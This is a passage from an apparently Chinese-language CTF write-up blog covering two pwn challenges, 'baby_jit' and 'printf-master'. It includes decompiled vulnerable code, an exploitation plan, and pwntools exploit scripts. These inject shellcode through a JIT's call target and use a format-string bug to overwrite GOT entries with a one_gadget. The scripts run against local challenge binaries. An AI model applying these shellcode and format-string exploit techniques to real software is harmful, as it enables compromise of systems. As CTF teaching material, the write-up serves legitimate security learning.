*dest; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">fgets</span>((<span class="type">char</span> *)s, <span class="number">0x30</span>, stdin);</span><br><span class="line">  *((_QWORD *)heap + count++) = s;</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">8LL</span> * (count + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, heap, <span class="number">8LL</span> * count);</span><br><span class="line">  <span class="built_in">free</span>(heap);</span><br><span class="line">  result = dest;</span><br><span class="line">  heap = dest;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;                                               <span class="comment">// 就是保持有一个堆块恰好能装下所有chunk_s的地址</span></span><br></pre></td></tr></table></figure><p>add就是一直保持有一个堆块刚好存了所有的堆块的地址，每个heap_s都有一个0x30的内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> offset; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *endptr; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;offset?&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">8</span>, stdin);</span><br><span class="line">  offset = (<span class="type">int</span>)(<span class="built_in">atof</span>(s) * <span class="number">12.0</span>);</span><br><span class="line">  v3 = <span class="number">12</span> * count + <span class="number">4</span>;</span><br><span class="line">  v6 = (<span class="type">char</span> *)<span class="built_in">mmap</span>((<span class="type">void</span> *)<span class="number">0x100000</span>, <span class="number">12</span> * count + <span class="number">20</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v6[v3 - <span class="number">4</span>] = <span class="number">0x48</span>;</span><br><span class="line">  v6[v3 - <span class="number">3</span>] = <span class="number">0x89</span>;</span><br><span class="line">  v6[v3 - <span class="number">2</span>] = <span class="number">0xD8</span>;</span><br><span class="line">  v6[v3 - <span class="number">1</span>] = <span class="number">0xC3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="type">char</span> *)*((_QWORD *)heap + i);</span><br><span class="line">    *v6 = <span class="number">0x48</span>;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">0xB8</span>;</span><br><span class="line">    v5 = <span class="built_in">strtoull</span>(s1 + <span class="number">4</span>, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">    *(_QWORD *)(v6 + <span class="number">2</span>) = v5;</span><br><span class="line">    v6 += <span class="number">10</span>;</span><br><span class="line">    *v6 = <span class="number">0x48</span>;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">-61</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;add&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sub&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;xor&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;and&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = ((__int64 (*)(<span class="type">void</span>))(offset + <span class="number">0x100000</span>))();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;result = %llu\n&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">munmap</span>((<span class="type">void</span> *)<span class="number">0x100000</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会记录一个offset，该offset可以为小数，之后取整数部分，之后的判断add和sub那些主要是要堆块的内容为”add deadbeef”之类的会将add改为对应的机器码，之后会执行0x100000+offset上的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000015B</span>0 <span class="number">48</span> <span class="number">31</span> DB                      <span class="keyword">xor</span>     rbx, rbx</span><br><span class="line">.text:<span class="number">00000000000015B</span>3 <span class="number">8B</span> <span class="number">45</span> C0                      mov     eax, [rbp+offset]</span><br><span class="line">.text:<span class="number">00000000000015B</span>6 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span>                add     eax, <span class="number">100000</span>h</span><br><span class="line">.text:<span class="number">00000000000015B</span>B <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">00000000000015B</span>D <span class="number">48</span> <span class="number">89</span> C2                      mov     rdx, rax</span><br><span class="line">.text:<span class="number">00000000000015</span>C0 B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000015</span>C5 FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>我们可以看到该执行用call rdx来执行，那么如果我们只用简短的一行指令进行read(0,rdx,nbytes)，那么我们就可以将之后的机器码覆盖为我们想要的东西，这道题感觉我之前遇到过一个类似的思路也是用read来执行机器码，主要是逆向的问题，我在比赛的时候没有搞懂add和sub那些判断的作用，一直卡在那里，但是其实这些都是没用的！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">FILENAME=<span class="string">&#x27;./baby_jit&#x27;</span></span><br><span class="line">p= process(FILENAME)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;offset&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">calc_sh= <span class="built_in">str</span>(u64(<span class="string">b&#x27;\x00\x90\x50\x5f\x52\x5e\x0f\x05&#x27;</span>)) </span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line">sh=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line">Add(<span class="string">f&#x27;add <span class="subst">&#123;calc_sh&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">Exec(<span class="string">b&#x27;0.3&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x20</span>)+asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="printf-master"><a href="#printf-master" class="headerlink" title="printf-master"></a>printf-master</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">myinit</span>();</span><br><span class="line">  <span class="built_in">gift</span>(a1, a2);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会有一个gift，选择stack，heap，libc的低字节</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4080 == <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Get stack address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Get heap  address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Get libc  address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Get code  address&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    buf = ptr;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="number">4uLL</span>);</span><br><span class="line">    v0 = *buf;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, &amp;ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *buf &gt; <span class="number">0x34</span>u )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">switch</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, &amp;puts);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, (&amp;savedregs - <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, buf);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">          _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_4080 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后便是主要部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, what&#x27;s your name?&quot;</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x101</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(buf, <span class="string">&#x27;$&#x27;</span>) )                       <span class="comment">// 不允许出现$</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(buf + i) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      ++v0;                                     <span class="comment">// n最多出现4次</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个一次性的格式化字符串漏洞，发现不能出现$，因此使用%c进行占位，因此%c输出的内容的字节是固定的，因此使用%c来进行占位可以更好的进行覆盖</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>首先先将printf的返回地址覆盖成start地址，同时泄露elfbase，libcbase等<ul><li>容易出现问题的地方：第一是vuln函数的退出是通过exit的，因此只能直接覆盖printf的返回地址了；第二是要覆盖为start地址，因为要恢复栈帧，不然之后的跳板会无法找到</li></ul></li><li>然后将exit_got覆盖为start地址，实现无限格式化字符串漏洞</li><li>之后便是覆盖<code>___stack_chk_fail_got</code>为<code>one_gadget</code></li><li>最后将<code>exit_got</code>覆盖为<code>___stack_chk_fail</code>即可</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=run()</span><br><span class="line">        sa(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>,tbs(<span class="number">1</span>))</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">        <span class="comment">#第一步</span></span><br><span class="line">        payload=<span class="string">b&#x27;%c&#x27;</span>*<span class="number">10</span>+<span class="string">b&#x27;%p&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;%p&#x27;</span>+fmt(<span class="string">&#x27;%&#123;stack-0x29-0x18&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">26</span>+fmt(<span class="string">&#x27;%&#123;0xa1b0-stack-26+0x18&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span></span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        elf_base=<span 